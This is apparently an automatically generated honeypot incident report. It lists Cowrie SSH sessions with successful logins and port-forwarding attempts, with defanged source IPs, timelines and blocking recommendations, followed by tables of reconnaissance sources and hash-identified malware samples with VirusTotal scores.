| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:24:45` | `cowrie.session.connect` |
| `2026-08-30 04:24:46` | `cowrie.client.version` |
| `2026-08-30 04:24:46` | `cowrie.client.kex` |
| `2026-08-30 04:24:48` | `cowrie.login.success` |
| `2026-08-30 04:24:49` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:24:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4531aaf1b67f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:25 |
| **Last Seen** | 2026-08-30 04:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:25:52` | `cowrie.session.connect` |
| `2026-08-30 04:25:52` | `cowrie.client.version` |
| `2026-08-30 04:25:53` | `cowrie.client.kex` |
| `2026-08-30 04:25:53` | `cowrie.login.success` |
| `2026-08-30 04:25:54` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:25:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:25:54` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91a7dde67c8

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-08-30 04:29 |
| **Last Seen** | 2026-08-30 04:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:29:33` | `cowrie.session.connect` |
| `2026-08-30 04:29:34` | `cowrie.client.version` |
| `2026-08-30 04:29:34` | `cowrie.client.kex` |
| `2026-08-30 04:29:36` | `cowrie.login.success` |
| `2026-08-30 04:29:37` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36eb8e771b8c

| Field | Detail |
|---|---|
| **Source IP** | `217.149.191[.]246` |
| **First Seen** | 2026-08-30 04:29 |
| **Last Seen** | 2026-08-30 04:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:29:36` | `cowrie.session.connect` |
| `2026-08-30 04:29:36` | `cowrie.client.version` |
| `2026-08-30 04:29:36` | `cowrie.client.kex` |
| `2026-08-30 04:29:38` | `cowrie.login.success` |
| `2026-08-30 04:29:38` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.149.191[.]246` to AbuseIPDB if not already reported
- [ ] Block `217.149.191[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7bea5eb5dc

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-08-30 04:29 |
| **Last Seen** | 2026-08-30 04:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:29:47` | `cowrie.session.connect` |
| `2026-08-30 04:29:47` | `cowrie.client.version` |
| `2026-08-30 04:29:47` | `cowrie.client.kex` |
| `2026-08-30 04:29:48` | `cowrie.login.success` |
| `2026-08-30 04:29:49` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa49c9660c19

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:30 |
| **Last Seen** | 2026-08-30 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:30:03` | `cowrie.session.connect` |
| `2026-08-30 04:30:03` | `cowrie.client.version` |
| `2026-08-30 04:30:03` | `cowrie.client.kex` |
| `2026-08-30 04:30:04` | `cowrie.login.success` |
| `2026-08-30 04:30:04` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:30:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:30:05` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb111a56066

| Field | Detail |
|---|---|
| **Source IP** | `35.205.213[.]88` |
| **First Seen** | 2026-08-30 04:31 |
| **Last Seen** | 2026-08-30 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:31:28` | `cowrie.session.connect` |
| `2026-08-30 04:31:28` | `cowrie.login.success` |
| `2026-08-30 04:31:29` | `cowrie.session.params` |
| `2026-08-30 04:31:29` | `cowrie.command.input` |
| `2026-08-30 04:31:29` | `cowrie.command.input` |
| `2026-08-30 04:31:29` | `cowrie.command.failed` |
| `2026-08-30 04:31:29` | `cowrie.command.input` |
| `2026-08-30 04:31:29` | `cowrie.log.closed` |
| `2026-08-30 04:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.213[.]88` to AbuseIPDB if not already reported
- [ ] Block `35.205.213[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3822b3de38c0

| Field | Detail |
|---|---|
| **Source IP** | `35.205.213[.]88` |
| **First Seen** | 2026-08-30 04:31 |
| **Last Seen** | 2026-08-30 04:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:31:42` | `cowrie.session.connect` |
| `2026-08-30 04:31:42` | `cowrie.login.success` |
| `2026-08-30 04:31:42` | `cowrie.session.params` |
| `2026-08-30 04:31:42` | `cowrie.command.input` |
| `2026-08-30 04:31:42` | `cowrie.command.failed` |
| `2026-08-30 04:31:53` | `cowrie.log.closed` |
| `2026-08-30 04:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.213[.]88` to AbuseIPDB if not already reported
- [ ] Block `35.205.213[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bafc6d691a22

| Field | Detail |
|---|---|
| **Source IP** | `35.205.213[.]88` |
| **First Seen** | 2026-08-30 04:31 |
| **Last Seen** | 2026-08-30 04:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:31:44` | `cowrie.session.connect` |
| `2026-08-30 04:31:44` | `cowrie.login.success` |
| `2026-08-30 04:31:44` | `cowrie.session.params` |
| `2026-08-30 04:31:44` | `cowrie.command.input` |
| `2026-08-30 04:31:53` | `cowrie.log.closed` |
| `2026-08-30 04:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.213[.]88` to AbuseIPDB if not already reported
- [ ] Block `35.205.213[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373b536037fe

| Field | Detail |
|---|---|
| **Source IP** | `182.52.133[.]240` |
| **First Seen** | 2026-08-30 04:34 |
| **Last Seen** | 2026-08-30 04:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:34:25` | `cowrie.session.connect` |
| `2026-08-30 04:34:26` | `cowrie.client.version` |
| `2026-08-30 04:34:26` | `cowrie.client.kex` |
| `2026-08-30 04:34:28` | `cowrie.login.success` |
| `2026-08-30 04:34:28` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.133[.]240` to AbuseIPDB if not already reported
- [ ] Block `182.52.133[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265640759641

| Field | Detail |
|---|---|
| **Source IP** | `59.188.114[.]121` |
| **First Seen** | 2026-08-30 04:34 |
| **Last Seen** | 2026-08-30 04:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:34:33` | `cowrie.session.connect` |
| `2026-08-30 04:34:34` | `cowrie.client.version` |
| `2026-08-30 04:34:34` | `cowrie.client.kex` |
| `2026-08-30 04:34:36` | `cowrie.login.success` |
| `2026-08-30 04:34:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.188.114[.]121` to AbuseIPDB if not already reported
- [ ] Block `59.188.114[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5dd17751a6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:35 |
| **Last Seen** | 2026-08-30 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:35:28` | `cowrie.session.connect` |
| `2026-08-30 04:35:28` | `cowrie.client.version` |
| `2026-08-30 04:35:28` | `cowrie.client.kex` |
| `2026-08-30 04:35:29` | `cowrie.login.success` |
| `2026-08-30 04:35:29` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:35:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:35:30` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b58e0c120af

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:40 |
| **Last Seen** | 2026-08-30 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:40:51` | `cowrie.session.connect` |
| `2026-08-30 04:40:51` | `cowrie.client.version` |
| `2026-08-30 04:40:51` | `cowrie.client.kex` |
| `2026-08-30 04:40:52` | `cowrie.login.success` |
| `2026-08-30 04:40:52` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:40:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:40:52` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447fa8ac806f

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-30 04:41 |
| **Last Seen** | 2026-08-30 04:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:41:09` | `cowrie.session.connect` |
| `2026-08-30 04:41:10` | `cowrie.client.version` |
| `2026-08-30 04:41:10` | `cowrie.client.kex` |
| `2026-08-30 04:41:12` | `cowrie.login.success` |
| `2026-08-30 04:41:12` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f56dbd2cab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:45 |
| **Last Seen** | 2026-08-30 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:45:07` | `cowrie.session.connect` |
| `2026-08-30 04:45:07` | `cowrie.client.version` |
| `2026-08-30 04:45:08` | `cowrie.client.kex` |
| `2026-08-30 04:45:08` | `cowrie.login.success` |
| `2026-08-30 04:45:09` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:45:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:45:09` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8232cf7678e8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:51 |
| **Last Seen** | 2026-08-30 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:51:30` | `cowrie.session.connect` |
| `2026-08-30 04:51:30` | `cowrie.client.version` |
| `2026-08-30 04:51:30` | `cowrie.client.kex` |
| `2026-08-30 04:51:31` | `cowrie.login.success` |
| `2026-08-30 04:51:31` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:51:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:51:31` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d29669b7f2fd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:54 |
| **Last Seen** | 2026-08-30 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:54:28` | `cowrie.session.connect` |
| `2026-08-30 04:54:28` | `cowrie.client.version` |
| `2026-08-30 04:54:28` | `cowrie.client.kex` |
| `2026-08-30 04:54:29` | `cowrie.login.success` |
| `2026-08-30 04:54:30` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:54:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:54:30` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `35.205.213[.]88` | **30** | 2026-08-30 04:31 | 2026-08-30 04:31 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-30 02:59 | 2026-08-30 04:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]25` | **3** | 2026-08-30 04:36 | 2026-08-30 04:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-30 03:29 | 2026-08-30 03:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.186.41[.]88` | **2** | 2026-08-30 04:24 | 2026-08-30 04:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.191.23[.]138` | 1 | 2026-08-30 03:34 | 2026-08-30 03:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.176[.]93` | 1 | 2026-08-30 03:30 | 2026-08-30 03:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.15.140[.]235` | 1 | 2026-08-30 03:17 | 2026-08-30 03:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.31.210[.]125` | 1 | 2026-08-30 03:50 | 2026-08-30 03:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.104.143[.]176` | 1 | 2026-08-30 03:11 | 2026-08-30 03:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-08-30 03:48 | 2026-08-30 03:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.247.171[.]186` | 1 | 2026-08-30 04:29 | 2026-08-30 04:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-30 03:54 | 2026-08-30 03:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.218.159[.]123` | 1 | 2026-08-30 04:29 | 2026-08-30 04:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-30 02:55 | 2026-08-30 02:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.72[.]171` | 1 | 2026-08-30 04:17 | 2026-08-30 04:17 | 10s | 0 | `T1592` | 🟢 LOW |
| `207.175.229[.]28` | 1 | 2026-08-30 02:57 | 2026-08-30 02:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]101` | 1 | 2026-08-30 03:12 | 2026-08-30 03:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.77.82[.]150` | 1 | 2026-08-30 02:57 | 2026-08-30 02:57 | 3s | 0 | `T1592` | 🟢 LOW |
| `46.59.108[.]174` | 1 | 2026-08-30 04:41 | 2026-08-30 04:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.167.166[.]161` | 1 | 2026-08-30 03:17 | 2026-08-30 03:19 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
